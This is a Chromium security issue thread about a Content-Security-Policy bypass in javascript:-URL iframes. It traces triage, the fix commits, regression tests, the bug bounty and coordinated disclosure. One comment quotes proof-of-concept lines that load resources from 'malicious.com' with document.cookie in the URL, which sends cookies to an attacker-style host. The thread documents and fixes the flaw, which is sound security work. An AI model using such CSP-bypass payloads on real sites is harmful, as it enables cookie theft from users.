# full CSP bypass while evaluating a javascript-URL in iframe.

| Field | Value |
|-------|-------|
| **Issue ID** | [40051848](https://issues.chromium.org/issues/40051848) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | [Deleted User] |
| **Assignee** | ar...@chromium.org |
| **Created** | 2020-03-25 |
| **Bounty** | $3,000.00 |

## Description

*No description available.*

## Timeline

### bo...@chromium.org (2020-03-26)

I've confirmed the above instructions do result in fetching the resources in 80.0.3987.149 on Linux and my cursory understanding is it should not. Better eyes will need to look this over for severity but I'm applying Medium as a default (and because Monorail makes me apply a label).

[Monorail components: -Blink Blink>SecurityFeature>ContentSecurityPolicy]

### mk...@chromium.org (2020-03-26)

+arthursonzogni@, who I believe was looking at something around the initial `about:blank` page's policy at some point in the recent past.

### ar...@chromium.org (2020-03-26)

I haven't tried to reproduce, not needed. I clearly see why the CSP are bypassed.

Navigations to javascript: URL resulting in a new document being committed is a totally separate "hack" (IMO) built next to the existing infrastructure. As a result, the document that has initiated the navigation is not given, hence we can't inherit CSP from it.

I can fix it, providing I spent time on it.

Some ideas:
1) [Long] Regularize this code path. I opened 2 month ago https://crbug.com/chromium/1048106 to start conversations about this. Firefox do not synchronously commit the document, which could allow ourself to spawn a new tasks and start reusing the existing navigation commit mechanism.
2) [Quick] Provide a fallback mechanism: If the document that has initiated the navigation is not know, inherit from the parent/owner. I have a in-review patch that make CSP inheritance to become understandable:
https://chromium-review.googlesource.com/c/chromium/src/+/2111170, we can probably just add a one line change on top of it to get it right more often.

I will try things in the next few weeks.

+CC some people from https://crbug.com/chromium/1048106 / navigation / loading. FYI.


### pa...@chromium.org (2020-03-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-03-26)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ar...@chromium.org (2020-03-31)

I will wait until https://crbug.com/1065876 is landed. This one is waiting the M83 branch cut.

Moving the Target from M81 to M84. Are you okay with this? I can try to get a separate quick mitigation to be cherry-picked for M83 if this is really needed.


### ar...@chromium.org (2020-04-06)

I took a deeper look.

The repro steps contained a lot of "working as intended" steps. In particular, every script executed in the repro steps are made from the "http://malicious.com" context, which is not forbidden. CSP aren't inherited except for local scheme.
See: https://www.w3.org/TR/CSP3/#security-inherit-csp

This is not a full CSP bypass. It is not bypassing 'script-src' for instance.

However, there is still something wrong: no CSP directives are bypassed except one: CSP:frame-src (alias for CSP:child-src)

Minimized repro steps:
~~~
<head>
<meta http-equiv="Content-Security-Policy" content="frame-src 'none'">
</head>
<body>
  <iframe src="javascript:
    let iframe=document.createElement('iframe');
    iframe.src='http://example.com' // <----- This sub-sub-frame must not load.
    document.body.appendChild(iframe)
  "></iframe>
</body>
</html>
~~~

It seems to be a wrong ordering in between:

1) The subframe  is created. The initial empty document is created. The subframe inherited CSP are sent to the propagated to the browser process.
2) The subframe's javascript-URL is evaluated. A sub-subframe is created and navigates. The browser process checks the sub-subframe URL against the subframe CSP.

Two possibilities:
------------------
1) Things are not ordered properly inside blink.
2) There is a renderer->browser IPC race condition.

### ar...@chromium.org (2020-04-09)

In the javascript:URL iframe, it seems the CSP context has not been inherited from its parent yet when the URL is evaluated. This allows to bypass any CSP(s) that are checked during this time frame.

From:
~~~
1)
			var o = document.createElement("object");
			o.data = \`http://malicious.com/bypass-object-src.html?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(o);
2)
			var i = document.createElement("iframe");
			i.src = \`http://malicious.com/bypass-child-src.html?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(i);
3)
			var s = document.createElement("script");
			s.src = \`http://malicious.com/bypass-script-src.js?id=SUCCESS&cookie=${document.cookie}&rand=${performance.now()}\`;
			document.body.appendChild(s);
~~~

1) and 2) must not be able to load the ".html" (because frame-src / object-src). However, loading their script is allowed after that.
3) must not be able to load the script. It does. Sorry I jump to the conclusion too quickly after seeing (1) and (2).

So YES, full CSP bypass here. Let's update this issue.

### ar...@chromium.org (2020-04-09)

> I will wait until https://crbug.com/1065876 is landed. This one is waiting the M83 branch cut.

I am very lucky. It turns out the patch I was waiting for:
https://chromium-review.googlesource.com/c/chromium/src/+/2111170/35 [Make CSP inheritance saner]
before starting on this bug is also fixing the bug.

That's unexpected, that's a good point for this patch! (+dcheng@ and vogelheim@ FYI)
I still don't know how it fixed it. I will have to take a closer look tomorrow.

That's nice to see this side project of refactoring bringing fruits so quickly (e.g. even before it has landed, a bug is fixed). Great! Turns out it wasn't a total waste of time after all.

I made a regression test:
https://chromium-review.googlesource.com/c/chromium/src/+/2144012

### ar...@chromium.org (2020-04-10)

Re #11

I tried to understand why my pending patch:
https://chromium-review.googlesource.com/c/chromium/src/+/2111170/35 [Make CSP inheritance saner]
unexpectedly fixed the issue.

The patch make the initial empty document to inherit from its owner (parent|opener)
See CreateCSPForInitialEmptyDocument() from the patch.

The current try to achieve the same, but in a very convoluted way. It tried & fail to guess whether the document was the initial empty document or not.
See my [[[ annotations ]]]
~~~
 
  [[[ initializer.ShouldSetURL() is true ]]]
  [[[ initializer.Url() is empty ]]]

  KURL url;
  if (initializer.ShouldSetURL())  [[ IS TRUE ]]]
    url = initializer.Url().IsEmpty() ? BlankURL() : initializer.Url();

  [[[ url is now about:blank => The next check "if" is false]]]

  // Alias certain security properties from |owner_document|. Used for the
  // case of about:blank pages inheriting the security properties of their
  // requestor context.
  //
  // Note that this is currently somewhat broken; Blink always inherits from
  // the parent or opener, even though it should actually be inherited from
  // the request initiator.
  if (url.IsEmpty() && initializer.HasSecurityContext() && 
      !initializer.OriginToCommit() && initializer.OwnerDocument()) {
    last_origin_document_csp =
        initializer.OwnerDocument()->GetContentSecurityPolicy();
  }

  csp_ = initializer.GetContentSecurityPolicy();

  [...]

  [[[ The next "if" is false because last_origin_document_csp is null ]]]

  // We should inherit the navigation initiator CSP if the document is loaded
  // using a local-scheme url.
  //
  // Note: about:srcdoc inherits CSP from its parent, not from its initiator.
  // In this case, the initializer.GetContentSecurityPolicy() is used.
  if (last_origin_document_csp && !url.IsAboutSrcdocURL() && 
      (url.IsEmpty() || url.ProtocolIsAbout() || url.ProtocolIsData() ||
       url.ProtocolIs("blob") || url.ProtocolIs("filesystem"))) {
    csp_->CopyStateFrom(last_origin_document_csp);
  }

  [[[ csp_ is empty ]]]
~~~

I don't know why the previous was so weird ¯\_(ツ)_/¯


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-04-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/8e9f47f228aa118b3523ab688bb0014f381b7bbe

commit 8e9f47f228aa118b3523ab688bb0014f381b7bbe
Author: arthursonzogni <arthursonzogni@chromium.org>
Date: Fri Apr 10 09:21:56 2020

Make CSP inheritance saner.

It was very hard to understand how the blink implementation of CSP
inheritance was working. The FrameLoader was sometimes defining a CSP in
FrameLoader::CreateCSP(), sometime not. Then it was overridden/completed
in SecurityInitContext::InitializeContentSecurityPolicy() based on the
side effects of several parameters.

This patch achieves the following:
- FrameLoader always defines the final CSP.
- SecurityInitContext does not override it.

There are many small potential behaviors changes in the patch. Choices
have been made to keep things simple and understandable. Maybe this will
introduces some regressions. This will be the opportunity to add
additional tests. As a result this marked as:
DO NOT COMMIT before M83 branch cut.

Change-Id: If00d28601853061556d0d5643dcb467ca262715c
Bug: 1065876, 1064676
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2111170
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Reviewed-by: Daniel Vogelheim <vogelheim@chromium.org>
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/heads/master@{#758172}

[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/dom/document_init.cc
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/dom/document_init.h
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/execution_context/security_context_init.cc
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/html/imports/html_import_loader.cc
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/loader/document_loader.cc
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/loader/document_loader.h
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/loader/frame_loader.cc
[modify] https://crrev.com/8e9f47f228aa118b3523ab688bb0014f381b7bbe/third_party/blink/renderer/core/loader/frame_loader.h


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-04-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2b980e388e60d2b3c18ab4591f4e862749fa65c7

commit 2b980e388e60d2b3c18ab4591f4e862749fa65c7
Author: arthursonzogni <arthursonzogni@chromium.org>
Date: Tue Apr 14 11:46:42 2020

Add regression test for https://crbug.com/1064676

This bug has been fortunately/unexpectedly fixed by:
https://chromium-review.googlesource.com/c/chromium/src/+/2111170

The old code was trying to "guess" the document was the initial empty
document. It failed.

The new code is using CreateCSPForInitialEmptyDocument() to set the CSP
of the initial empty document. It works consistently.

Bug: 1064676
Change-Id: I3778b7a2a0e4eed0599424e3711cbaec24c80c49
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2144012
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Auto-Submit: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Reviewed-by: Mike West <mkwst@chromium.org>
Cr-Commit-Position: refs/heads/master@{#758793}

[modify] https://crrev.com/2b980e388e60d2b3c18ab4591f4e862749fa65c7/third_party/blink/web_tests/external/wpt/content-security-policy/inheritance/iframe-all-local-schemes.sub.html


### ar...@chromium.org (2020-04-16)

I quickly verified patch from https://crbug.com/chromium/1064676#c13. Everything is fixed, except for the frame-src directive.

### ar...@chromium.org (2020-04-21)

The future test + fix for the second issue ("frame-src / child-src / ...")
https://chromium-review.googlesource.com/c/chromium/src/+/2159242/

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-04-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e9a4cd15f16c2cf24c31133120d4c7f0fa5f505d

commit e9a4cd15f16c2cf24c31133120d4c7f0fa5f505d
Author: arthursonzogni <arthursonzogni@chromium.org>
Date: Mon Apr 27 09:39:30 2020

Forward CSP, even for the initial empty document.

https://crbug.com/chromium/1064676 has been fixed by:
  https://chromium-review.googlesource.com/c/chromium/src/+/2111170
And tested by:
  https://chromium-review.googlesource.com/c/chromium/src/+/2144012

The bug was fixed for every CSP checked in the renderer process. However
there are still an issue for the one checked in the browser process. It
turns out the CSP in the initial empty document weren't properly
propagated to the browser process.

This patch:
  1) Fix the bug by sending the CSP of the initial empty document.
  2) Add a regression test (WPT).

This patch can potentially also fix:
 - https://crbug.com/1072719
 - https://crbug.com/955350
(I haven't checked. I will do it later after landing this patch)

Bug: 1064676, 1072719, 955350
Change-Id: Ie5325035c74d9e2476d6c80af3e5d5c9068ea928
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2159242
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Auto-Submit: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Daniel Cheng <dcheng@chromium.org>
Cr-Commit-Position: refs/heads/master@{#762769}

[modify] https://crrev.com/e9a4cd15f16c2cf24c31133120d4c7f0fa5f505d/third_party/blink/renderer/core/loader/document_loader.cc
[add] https://crrev.com/e9a4cd15f16c2cf24c31133120d4c7f0fa5f505d/third_party/blink/web_tests/external/wpt/content-security-policy/inheritance/frame-src-javascript-url.html
[add] https://crrev.com/e9a4cd15f16c2cf24c31133120d4c7f0fa5f505d/third_party/blink/web_tests/external/wpt/content-security-policy/inheritance/support/empty.html


### ar...@chromium.org (2020-04-27)

This should be completely fixed after:
- https://chromium-review.googlesource.com/c/chromium/src/+/2159242
- https://chromium-review.googlesource.com/c/chromium/src/+/2111170

I am not going to request a merge into M83. As I said in:
[Make CSP inheritance saner]
~~~
There are many small potential behaviors changes in the patch. Choices
have been made to keep things simple and understandable. Maybe this will
introduces some regressions. This will be the opportunity to add
additional tests. As a result this marked as:
DO NOT COMMIT before M83 branch cut.
~~~
I think this change to be too complex to be safe for merge. One unexpected outcome of this patch was semi-fixing this issue for instance. I am also expecting to see some regression as well. We will see.


### [Deleted User] (2020-04-27)

[Empty comment from Monorail migration]

### na...@google.com (2020-04-27)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-28)

Requesting merge to beta M83 because latest trunk commit (762769) appears to be after beta branch point (756066).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-04-28)

This bug requires manual review: To minimize risk and increase branch stability, all merge requests are being reviewed manually by the release team.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sr...@google.com (2020-04-28)

pls help answer the questions in https://crbug.com/chromium/1064676#c22 for merge review. 

+adetaylor@ to help reviewand approve.

### ad...@chromium.org (2020-04-28)

Nope - per https://crbug.com/chromium/1064676#c18 it's too risky.

### na...@google.com (2020-04-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-05-01)

Congrats! The Panel decided to award $3,000 for this report!

Someone from Finance will be in contact soon to sort out your payment information. 

### na...@google.com (2020-05-01)

[Empty comment from Monorail migration]

### ar...@chromium.org (2020-05-14)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-05-18)

The bug will become public 14 weeks after it's fixed, to give it time to roll out to a large percentage of our users. We may well be able to agree to a publication date before that if it helps you, but we certainly wouldn't want this published until it comes out in in the M84 release, which will be just over 6 weeks from now. I hope that's OK with you. We are not rushing the fix for this since it may have web-platform-visible changes; we want to give it time in beta for such problems to be spotted.

### ad...@chromium.org (2020-05-20)

We'll need to agree a slightly later date. First of all, I've discovered that the M84 release is slightly later than scheduled in order to avoid the US 4th July holiday - so it should be July 14th (https://chromiumdash.appspot.com/schedule). Secondly, that's when the release initially comes out but it's gradually rolled out to 100% usually over the course of a week. That's the earliest we would be comfortable opening this bug. So that would be approximately 21st July, but in case there are problems with M84 rollout it would be slightly later.

That is in fact getting very close to the "Fix date + 14 weeks" automatic opening anyway. Sorry about that. As I say, we do not want to rush this one out due to the risk of breakages.

### ad...@google.com (2020-05-20)

After the 14 weeks after fixing (which seems to be late July by my maths) this bug will get the "allpublic" label applied. After that, you're free to do whatever you like without asking us! If you'd like to do it a bit sooner, as soon as it gets a "Release" label (e.g, "Release-0-M85") then that means it's going through the release process and do feel free to get in touch if you want to know about the rollout and whether we can open it a bit earlier. Sound OK? Thanks for being so helpful!

### ad...@google.com (2020-07-13)

[Empty comment from Monorail migration]

### ad...@google.com (2020-07-13)

gal@perimeterx.com - how would you like to be credited in the Chrome release notes?

### ad...@chromium.org (2020-07-13)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-07-13)

Not quite. We like to allow a bit longer, because it takes a while for Chrome stable builds to be ramped up to 100% of the population. That's the reason for the "14 weeks after fixing" rule mentioned in https://crbug.com/chromium/1064676#c36 and we don't like full bug details to be available before that point. We will be mentioning this in the release notes tomorrow with a brief description, and we will submit a (very slightly) fuller description for the CVE in a few days' time. But in neither case will the description be enough to exploit the bug.

I'm getting a message from Sheriffbot saying that it will likely make the issue public on Aug 3rd. If you'd like it to be opened a little before that, we're open to discussion, but we'd certainly prefer to wait another 10+ days to ensure most people have got M84.

### ad...@google.com (2020-07-22)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-07-29)

Hi gal@, thanks for keeping in touch and thanks for your patience. I've removed the view restriction on this bug! Feel free to publish any time from now on.

### ma...@gmail.com (2020-07-30)

Hi adetaylo@ natashapabrai@ , I and dlive report https://crbug.com/chromium/955350 more than 1 year ago before https://crbug.com/chromium/1064676
but unfortunately gal get the bounty and CVE-ID , for us just a dupe.

just see the POC

https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=439045

https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=390064

It's a same issue, Apparently we reported it earlier.

We just want to be treated fairly , thank you so much for fixing the issue.

### ad...@chromium.org (2020-07-30)

Thanks ma7has.l, we'll look into it.

### ad...@chromium.org (2020-07-30)

ma7h1as.l our rules are indeed that the earliest-reported bug should be rewarded, so this does appear to be a mistake. I will bring https://crbug.com/chromium/955350 to the attention of the VRP panel next week so they can confirm it really is a duplicate, and if so, we'll make it right. Expect to hear back from me around this time next week.

### [Deleted User] (2020-07-30)

The older reward-topanel https://crbug.com/chromium/955350 has been merged into this one. Please manually review this issue to see if the duplicate is potentially eligible for a reward.



### ad...@google.com (2020-08-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-05)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1064676?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocked-on: crbug.com/chromium/1065876]
[Monorail mergedwith: crbug.com/chromium/955350]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051848)*
